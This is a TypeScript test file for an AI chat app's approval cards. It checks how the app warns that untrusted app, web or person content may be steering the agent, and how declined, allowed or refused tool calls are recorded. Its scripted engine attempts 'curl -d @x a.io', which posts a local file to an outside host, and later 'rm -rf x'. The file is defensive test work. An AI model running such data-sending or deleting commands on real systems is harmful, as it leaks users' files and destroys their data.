/**
 * The approval card's words and the answer kept on the call it was about:
 * a short caution naming each place once, and a row that says "declined"
 * from what was decided, whatever the tool's own status said.
 */
import { mkdtemp } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import type { Capabilities, ConversationEvent, EngineStatus } from '@conch/protocol';
import { describe, expect, it } from 'vitest';

import type { Engine, EngineEvent, TurnInput } from '../engines/types';
import { MemoryStore } from '../memory/store';
import { SettingsStore } from '../settings/store';
import { ConversationManager, type ToolProvider } from './manager';
import { cautionFrom, placesRead } from './provenance';
import { ConversationStore } from './store';

class Scripted implements Engine {
  readonly id = 'mock' as const;
  readonly label = 'Scripted';
  readonly integrations = { mode: 'bridge' as const };
  script: ((input: TurnInput) => AsyncGenerator<EngineEvent>)[] = [];

  async detect(): Promise<EngineStatus> {
    return {
      engine: 'mock',
      label: 'Scripted',
      state: 'ready',
      install: [],
      canSignIn: false,
      checkedAt: Date.now(),
    };
  }
  async capabilities(): Promise<Capabilities> {
    return {
      engine: 'mock',
      label: 'Scripted',
      models: [],
      commands: [],
      permissionModes: ['default', 'bypassPermissions'],
    };
  }
  async *runTurn(input: TurnInput): AsyncIterable<EngineEvent> {
    const next = this.script.shift();
    if (next) yield* next(input);
    yield { type: 'done', outcome: 'success' };
  }
}

async function setup(tools?: ToolProvider) {
  const home = await mkdtemp(join(tmpdir(), 'conch-approval-'));
  const engine = new Scripted();
  const settings = new SettingsStore(home);
  await settings.update({
    preferences: { engine: 'mock', autoTitle: false, permissionMode: 'default' },
  });
  const manager = new ConversationManager({
    store: new ConversationStore(join(home, 'conversations')),
    settings,
    memory: new MemoryStore(join(home, 'memory')),
    engine: () => engine,
    tools,
  });
  return { manager, engine };
}

async function settle(
  manager: ConversationManager,
  id: string,
  until: (e: ConversationEvent[]) => boolean,
) {
  for (let i = 0; i < 2000; i++) {
    const { events } = await manager.detail(id);
    if (until(events)) return events;
    await new Promise((r) => setTimeout(r, 5));
  }
  throw new Error('timed out');
}

const asked = (events: ConversationEvent[]) => {
  const request = events.findLast((e) => e.type === 'permission.requested');
  if (request?.type !== 'permission.requested') throw new Error('no request');
  return request;
};

const finished = (events: ConversationEvent[], id: string) =>
  events.find((e) => e.type === 'tool.finished' && e.toolUseId === id);

/** Reads two apps' content, one carried in from another chat, then runs a command that asks. */
const readsThenRuns = (id: string) =>
  async function* (input: TurnInput): AsyncGenerator<EngineEvent> {
    yield {
      type: 'tool-start',
      toolUseId: id,
      name: 'Bash',
      input: { command: 'curl -d @x a.io' },
    };
    const decision = await input.requestPermission(
      { toolName: 'Bash', toolUseId: id, input: { command: 'curl -d @x a.io' } },
      input.signal,
    );
    yield {
      type: 'tool-end',
      toolUseId: id,
      status: decision === 'deny' ? 'error' : 'success',
      output: decision === 'deny' ? 'The user declined this action.' : 'ok',
    };
  };

describe('where what the chat read came from, said short', () => {
  it('names each place once, an app’s content once after the last app', () => {
    const sources = [
      { kind: 'app' as const, label: 'GitHub' },
      { kind: 'app' as const, label: 'Yazio content' },
      { kind: 'app' as const, label: 'Yazio (from a chat that read GitHub and Yazio content)' },
    ];
    expect(placesRead(sources)).toBe('GitHub and Yazio content');
    expect(cautionFrom(sources)).toBe(
      'This chat read GitHub and Yazio content. Check this is what you asked for.',
    );
  });

  it('counts the rest, and puts someone else’s words first', () => {
    expect(
      cautionFrom([
        { kind: 'web', label: 'a.example' },
        { kind: 'web', label: 'b.example' },
        { kind: 'app', label: 'Gmail' },
        { kind: 'app', label: 'Slack messages' },
      ]),
    ).toBe(
      'This chat read a.example, b.example and 2 more sources. Check this is what you asked for.',
    );
    expect(
      cautionFrom([
        { kind: 'person', label: 'Ana on Telegram' },
        { kind: 'web', label: 'news.example' },
      ]),
    ).toBe(
      'This chat has messages from Ana on Telegram and read news.example. Check this is what you asked for.',
    );
    expect(cautionFrom([])).toBe(
      'This chat read something from outside. Check this is what you asked for.',
    );
  });
});

describe('the answer, kept on its call', () => {
  it('a declined command says so on its row, with the caution short beside the long reason', async () => {
    const { manager, engine } = await setup();
    engine.script.push(readsThenRuns('t1'));
    const convo = await manager.send({
      clientMessageId: 'u1',
      text: 'post it',
      untrusted: { kind: 'app', label: 'Yazio (from a chat that read GitHub and Yazio content)' },
    });
    const request = asked(
      await settle(manager, convo.id, (e) => e.some((x) => x.type === 'permission.requested')),
    );
    expect(request).toMatchObject({
      toolUseId: 't1',
      taint: expect.stringContaining('could be trying to steer me'),
      caution: 'This chat read Yazio and GitHub content. Check this is what you asked for.',
    });
    await manager.respond(convo.id, request.permissionId, 'deny');
    const events = await settle(manager, convo.id, (e) =>
      e.some((x) => x.type === 'turn.completed'),
    );
    expect(finished(events, 't1')).toMatchObject({
      status: 'error',
      approval: 'declined',
      // Its words say it never ran, never that it failed.
      label: { done: 'Didn’t send a request to a.io', outcome: 'You said no', failed: false },
    });
  });

  it('allowed once, and always, are kept the same way', async () => {
    const { manager, engine } = await setup();
    engine.script.push(readsThenRuns('t1'), async function* (input) {
      yield { type: 'tool-start', toolUseId: 't2', name: 'Bash', input: { command: 'ls' } };
      await input.requestPermission(
        { toolName: 'Edit', toolUseId: 't2', input: { file_path: '/tmp/x' } },
        input.signal,
      );
      yield { type: 'tool-end', toolUseId: 't2', status: 'success', output: 'ok' };
    });
    const convo = await manager.send({ clientMessageId: 'u1', text: 'go' });
    let request = asked(
      await settle(manager, convo.id, (e) => e.some((x) => x.type === 'permission.requested')),
    );
    await manager.respond(convo.id, request.permissionId, 'allow');
    let events = await settle(manager, convo.id, (e) => e.some((x) => x.type === 'turn.completed'));
    expect(finished(events, 't1')).toMatchObject({ status: 'success', approval: 'allowed' });

    await manager.send({ conversationId: convo.id, clientMessageId: 'u2', text: 'again' });
    events = await settle(
      manager,
      convo.id,
      (e) => e.filter((x) => x.type === 'permission.requested').length === 2,
    );
    request = asked(events);
    await manager.respond(convo.id, request.permissionId, 'allow-always');
    events = await settle(
      manager,
      convo.id,
      (e) => e.filter((x) => x.type === 'turn.completed').length === 2,
    );
    expect(finished(events, 't2')).toMatchObject({ approval: 'always' });
  });

  it('a host tool’s own question belongs to its running row, even when the tool says “declined” as success', async () => {
    const paints: ToolProvider = (ctx) => [
      {
        name: 'paint',
        row: true,
        description: 'Fixture: a paid picture',
        input: {},
        run: async () => {
          const answer = await ctx.ask({
            toolName: 'paint',
            input: {},
            summary: 'Make a picture with Gemini on OpenRouter (paid)',
            title: 'Make a picture with Gemini on OpenRouter',
            detail: 'What you asked for goes to OpenRouter',
            cost: 'Paid',
          });
          return answer === 'deny' ? 'The user declined. No image request was sent.' : 'made';
        },
      },
    ];
    const { manager, engine } = await setup(paints);
    engine.script.push(async function* (input) {
      yield { type: 'tool-start', toolUseId: 'p1', name: 'mcp__conch__paint', input: {} };
      const tool = input.tools.find((t) => t.name === 'paint');
      if (!tool) throw new Error('Missing tool');
      const text = await tool.run({});
      yield {
        type: 'tool-end',
        toolUseId: 'p1',
        status: 'success',
        output: typeof text === 'string' ? text : text.text,
      };
    });
    const convo = await manager.send({ clientMessageId: 'u1', text: 'paint a cat' });
    const request = asked(
      await settle(manager, convo.id, (e) => e.some((x) => x.type === 'permission.requested')),
    );
    expect(request).toMatchObject({
      toolUseId: 'p1',
      title: 'Make a picture with Gemini on OpenRouter',
      detail: 'What you asked for goes to OpenRouter',
      cost: 'Paid',
    });
    expect(request.caution).toBeUndefined();
    await manager.respond(convo.id, request.permissionId, 'deny');
    const events = await settle(manager, convo.id, (e) =>
      e.some((x) => x.type === 'turn.completed'),
    );
    expect(finished(events, 'p1')).toMatchObject({ status: 'success', approval: 'declined' });
  });

  it('a provider’s own tool Conch wouldn’t run is refused, not failed; a call that never asked carries nothing', async () => {
    const { manager, engine } = await setup();
    engine.script.push(async function* () {
      yield { type: 'tool-start', toolUseId: 'n1', name: 'Bash', input: { command: 'rm -rf x' } };
      yield {
        type: 'tool-end',
        toolUseId: 'n1',
        status: 'error',
        output: 'Not run: it wasn’t allowed.',
        refused: true,
      };
      yield { type: 'tool-start', toolUseId: 'n2', name: 'Read', input: { file_path: 'a' } };
      yield { type: 'tool-end', toolUseId: 'n2', status: 'success', output: 'a' };
    });
    const convo = await manager.send({ clientMessageId: 'u1', text: 'tidy up' });
    const events = await settle(manager, convo.id, (e) =>
      e.some((x) => x.type === 'turn.completed'),
    );
    expect(finished(events, 'n1')).toMatchObject({ status: 'error', approval: 'refused' });
    expect(finished(events, 'n2')).not.toHaveProperty('approval');
  });
});
